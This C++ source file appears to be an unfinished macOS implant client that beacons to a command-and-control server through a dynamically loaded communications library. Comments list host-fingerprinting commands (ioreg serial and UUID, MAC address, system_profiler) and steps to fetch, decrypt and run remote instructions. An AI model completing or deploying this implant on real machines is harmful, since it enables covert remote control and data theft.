#include "ClientPP.hpp"

namespace client {
    const int RESP_BUFFER_SIZE = 4096;
}

bool ClientPP::osInfo (int dwRandomTimeSleep) {
    // if parameters are populated, just return true

    // otherwise, perform discovery actions, send to C2 server, return true
    //      ClientPP::createClientID()
    //      getpwuid() > pw_name - https://pubs.opengroup.org/onlinepubs/009604499/functions/getpwuid.html
    //      scutil --get ComputerName
    //      uname -m
    //      system_profiler SPHardwareDataType 2>/dev/null | awk ...
    //      send POST request with data to C2
    
    // return false on any issues or errors
    return true;
}

void ClientPP::runClient(int dwRandomTimeSleep, void * dylib) {
    // heartbeat - send HTTP GET request to server
    std::string heartbeat = "I will eventually contain the heartbeat";
    std::vector<unsigned char> heartbeat_vector( heartbeat.begin(), heartbeat.end() );
    std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(dylib, "GET", heartbeat_vector);

    std::cout << "Response buffer contains: ";
    for (auto i: response_vector) {
        std::cout << i;
    }
    std::cout << std::endl;

    // receive and decrypt instructions
    // execute instructions
    // encrypt instructions
    // return output - send HTTP POST request to server

    // sleep after execution
    std::this_thread::sleep_for(std::chrono::milliseconds(dwRandomTimeSleep));
}

int8_t ClientPP::createClientID() {
    int8_t id[24];

    //  serial number - ioreg -rdl -c IOPlatformExpertDevice | awk '/IOPlatformSerialNumber/ {split ($0, line, "\""); printf("%s", line[4]); }'
    //  hardware UUID - ioreg -rdl -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ {split ($0, line, "\""); printf("%s", line[4]); }'
    //  mac address - ifconfig en0 | awk '/ether/{print $2}'
    //  randomly generated UUID - uuidgen

    return *id;
}

std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data) {
    // set response_buffer and response_length to hold the HTTP response and size
    unsigned char response_buffer[client::RESP_BUFFER_SIZE] = { 0 };
    unsigned char* response_buffer_ptr = &response_buffer[0];
    int response_length = 0;
    int* response_length_ptr = &response_length;
    
    // loads CommsLib exported function that generates the HTTP request
    void (*sendRequest)(const char * str, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length) = (void(*)(const char*, const std::vector<unsigned char>, unsigned char**, int**))dlsym(dylib, "sendRequest");
    if (sendRequest == NULL) {
        std::cout << "unable to load libComms.dylib sendRequest" << std::endl;
        dlclose(dylib);
        return std::vector<unsigned char>();
    }

    // call CommsLib sendRequest and pass the pointers to the response_buffer and response_length for updating
    sendRequest(type.c_str(), data, &response_buffer_ptr, &response_length_ptr);

    return std::vector<unsigned char>(response_buffer, response_buffer + response_length);
}
